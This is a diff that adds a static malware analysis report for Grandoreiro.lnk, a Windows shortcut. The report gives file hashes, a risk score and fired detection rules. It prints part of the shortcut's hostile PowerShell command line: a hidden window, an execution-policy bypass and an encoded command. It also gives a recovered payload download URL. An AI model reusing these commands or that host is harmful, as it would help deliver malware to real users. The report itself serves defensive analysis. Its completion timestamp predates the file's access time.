@@ -1,0 +1,79 @@
+
+╭──────────────────────────────────────────────────────────────────────────────────────────────────╮
+│  ThreatLens  Static Malware Analysis                                                             │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+
+                                          File Information                                          
+╭────────┬─────────────────────────────────────────────────────────────────────────────────────────╮
+│ File   │ Grandoreiro.lnk                                                                         │
+│ Path   │ /home/pmafma/Documents/Malware/lnk test malware/Grandoreiro.lnk                         │
+│ Size   │ 8.3 KiB                                                                                 │
+│ Type   │ MS Windows shortcut, Item id list present, Points to a file or directory, Has           │
+│        │ Description string, Has Relative path, Has Working directory, Has command line          │
+│        │ arguments, Icon number=2, Unicoded, HasExpIcon, Archive, ctime=Tue May  5 22:37:55      │
+│        │ 2026, atime=Thu Jun 11 16:56:01 2026, mtime=Tue May  5 22:37:55 2026, length=423424,    │
+│        │ window=showminnoactive, IDListSize 0x020d, Root folder                                  │
+│        │ "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath                     │
+│        │ "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"                             │
+│ MIME   │ application/x-ms-shortcut                                                               │
+│ MD5    │ d4cb7d7128133c5ed5f17a1f697b0410                                                        │
+│ SHA256 │ fee0824bcc6bc86c65ecfb522035e66a86842956eab83153eda141c20709b5f8                        │
+│ TLSH   │ T10A0205212CE710DDF2774B7527DCF9FB0AA6F4A5682D71B42041C6444BB0AD4DCA2EB5                │
+│ ssdeep │ 192:8p8eI1L2cMacvlkLFP6cDc/X/Jc1/CO7jN0/OVlccMvMhqecrYk0:XeIJ2cMacv6LFP6cDcPxc0ojN02Vlc │
+│        │ cR                                                                                      │
+╰────────┴─────────────────────────────────────────────────────────────────────────────────────────╯
+
+  █████████████░░░░░░░░░  60/100  HIGH
+
+  Likely malicious with powershell.exe launching encoded PowerShell, document icon disguising an 
+executable target, known malware-hosting infrastructure, built on host 'laptop-pp7fvpth'
+
+  FINDINGS
+                                                                                                    
+ Module           Δ   Reason                                                                        
+ ────────────────────────────────────────────────────────────────────────────────────────────────── 
+ lnk_analysis   +60   LOLBin target launching a Base64-encoded PowerShell command (+35); LOLBin     
+                      target fetching a remote URL (+28); Documen...                                
+                                                                                                    
+
+  Windows Shortcut Indicators
+                                                                                                    
+ Classification    MALICIOUS                                                                        
+ Target            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe                        
+ Arguments         -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand                      
+                   dAByAHkAIAB7ACAAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBl     
+                   AHIAXQA6ADoAUwBlAGMAdQ… (+1 more — use -v to show all)                           
+ Argument length   3196 characters (46 tokens)                                                      
+ Icon masquerade   C:\Windows\System32\imageres.dll — document icon over an executable target       
+                   (T1027.012)                                                                      
+ Relative path     ..\..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (4 traversal  
+                   levels)                                                                          
+ Build machine     laptop-pp7fvpth                                                                  
+ Pattern           Base64-encoded PowerShell command                                                
+ Pattern           Hidden window style                                                              
+ Pattern           ExecutionPolicy bypass                                                           
+ Deobfuscation     layers undone: base64 → base64 → reverse → de-double                             
+ Recovered IOC     https://11032026sver.blob.core.windows.net/homeplus/procespro.zip                
+ Recovered IOC     11032026sver.blob.core.windows.net                                               
+ Fired rule        LOLBin target launching a Base64-encoded PowerShell command (+35)                
+ Fired rule        LOLBin target fetching a remote URL (+28)                                        
+ Fired rule        Document icon in front of a LOLBin target (MITRE T1027.012) (+25)                
+ Fired rule        Command line references known malware-hosting infrastructure (+22)               
+ Fired rule        LOLBin target launched with a hidden window (+18)                                
+ Fired rule        LOLBin target with execution-policy or profile bypass flags (+16)                
+ Fired rule        Argument string far longer than any legitimate shortcut carries (+15)            
+ Fired rule        Obfuscated command line (+13)                                                    
+ Fired rule        More than four command-line arguments (+6)                                       
+ Fired rule        Target is a living-off-the-land binary (+5)                                      
+                                                                                                    
+
+  modules  ✓✓   2 ran
+
+╭───────────────────────────────────── Recommended Next Steps ─────────────────────────────────────╮
+│                                                                                                  │
+│    • Consider dynamic analysis — set dynamic_provider in config.yaml                             │
+│                                                                                                  │
+╰──────────────────────────────────────────────────────────────────────────────────────────────────╯
+
+Analysis complete  2026-01-01 00:00:00 UTC
+
